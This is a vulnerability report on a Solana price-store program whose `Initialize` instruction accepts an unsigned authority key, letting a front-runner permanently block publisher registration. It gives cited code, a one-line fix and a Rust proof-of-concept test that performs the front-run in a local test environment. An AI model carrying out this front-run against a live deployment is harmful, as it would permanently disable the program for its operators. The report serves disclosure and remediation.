### Title
Unchecked `authority` Field in `Initialize` Enables Front-Run to Permanently Brick Publisher Registration — (`target_chains/solana/programs/pyth-price-store/src/processor/initialize.rs`)

### Summary

The `Initialize` instruction accepts an arbitrary 32-byte `authority` field with no requirement that the corresponding account sign the transaction. Because the config PDA is a singleton that can only be initialized once, an attacker who races to call `Initialize` first can store an uncontrollable pubkey as the program authority, permanently preventing any legitimate publisher from ever being registered.

---

### Finding Description

The `initialize` processor validates only that the **payer** is a signer: [1](#0-0) 

`args.authority` — a raw `[u8; 32]` from `InitializeArgs` — is written directly into the config PDA with no signer check: [2](#0-1) 

The `InitializeArgs` struct confirms `authority` is just an unconstrained byte array: [3](#0-2) 

The config PDA is a singleton. Once `data.format` is set to `FORMAT`, any subsequent call returns `AlreadyInitialized`: [4](#0-3) 

`InitializePublisher` then enforces that the signer's key matches `config.authority`: [5](#0-4) 

If `config.authority` is set to `[0u8; 32]` (or any key the attacker does not control), no valid signature can ever satisfy this check, and `InitializePublisher` is permanently blocked.

---

### Impact Explanation

Permanent denial of the `InitializePublisher` instruction. No publisher can ever be legitimately registered. The program has no admin-reset or upgrade path for the config account — there is no `UpdateAuthority` or `Reinitialize` instruction.

---

### Likelihood Explanation

The attack window is narrow (between program deployment and the deployer's `Initialize` call). Solana lacks a traditional mempool, making classic front-running harder than on EVM chains. However:
- The attack is trivially executable if the deployer does not initialize in the same transaction as deployment.
- Any observer of the validator's transaction queue (e.g., via RPC `getRecentBlockhash` polling or validator-level access) can attempt it.
- The cost is a single transaction fee.
- The impact is irreversible.

---

### Recommendation

Require that the account corresponding to `args.authority` is present in the accounts list **and** is a signer, or simply enforce `args.authority == payer.key.to_bytes()`. The simplest fix in `initialize.rs`:

```rust
// After validate_payer:
ensure!(
    ProgramError::MissingRequiredSignature,
    args.authority == payer.key.to_bytes()
);
```

This ensures only the signing payer can designate themselves (or a co-signer) as authority.

---

### Proof of Concept

```rust
#[tokio::test]
async fn test_frontrun_initialize() {
    let id = Pubkey::new_unique();
    let (mut banks_client, legitimate_deployer, recent_blockhash) =
        ProgramTest::new("publishers", id, processor!(crate::processor::process_instruction))
            .start().await;

    let (config, config_bump) = Pubkey::find_program_address(&[CONFIG_SEED.as_bytes()], &id);
    let attacker = Keypair::new(); // fund attacker separately

    // Attacker front-runs with authority = [0u8; 32]
    let mut data = vec![crate::instruction::Instruction::Initialize as u8, config_bump];
    data.extend_from_slice(&[0u8; 32]);
    let tx = Transaction::new_signed_with_payer(
        &[Instruction { program_id: id, data, accounts: vec![
            AccountMeta::new(attacker.pubkey(), true),
            AccountMeta::new(config, false),
            AccountMeta::new_readonly(system_program::id(), false),
        ]}],
        Some(&attacker.pubkey()), &[&attacker], recent_blockhash,
    );
    banks_client.process_transaction(tx).await.unwrap(); // succeeds

    // Legitimate deployer's Initialize now fails
    let mut data = vec![crate::instruction::Instruction::Initialize as u8, config_bump];
    data.extend_from_slice(&legitimate_deployer.pubkey().to_bytes());
    let tx = Transaction::new_signed_with_payer(...);
    assert!(banks_client.process_transaction(tx).await.is_err()); // AlreadyInitialized

    // InitializePublisher now requires zero-key signature — impossible
}
```

### Citations

**File:** target_chains/solana/programs/pyth-price-store/src/processor/initialize.rs (L23-25)
```rust
    let payer = validate_payer(accounts.next())?;
    let config = validate_config(accounts.next(), args.config_bump, program_id, true)?;
    let system = validate_system(accounts.next())?;
```

**File:** target_chains/solana/programs/pyth-price-store/src/processor/initialize.rs (L43-43)
```rust
    accounts::config::create(*config.data.borrow_mut(), args.authority)?;
```

**File:** target_chains/solana/programs/pyth-price-store/src/instruction.rs (L47-55)
```rust
#[derive(Debug, Clone, Copy, Zeroable, Pod)]
#[repr(C, packed)]
pub struct InitializeArgs {
    /// PDA bump of the config account.
    pub config_bump: u8,
    /// The signature of the authority account will be required to execute
    /// `InitializePublisher` instruction.
    pub authority: [u8; 32],
}
```

**File:** target_chains/solana/programs/pyth-price-store/src/accounts/config.rs (L43-47)
```rust
    if data.format != 0 {
        return Err(ReadAccountError::AlreadyInitialized);
    }
    data.format = FORMAT;
    data.authority = authority;
```

**File:** target_chains/solana/programs/pyth-price-store/src/validate.rs (L71-78)
```rust
    ensure!(ProgramError::MissingRequiredSignature, authority.is_signer);
    ensure!(ProgramError::InvalidArgument, authority.is_writable);
    let config_data = config.data.borrow();
    let config = accounts::config::read(*config_data)?;
    ensure!(
        ProgramError::MissingRequiredSignature,
        authority.key.to_bytes() == config.authority
    );
```
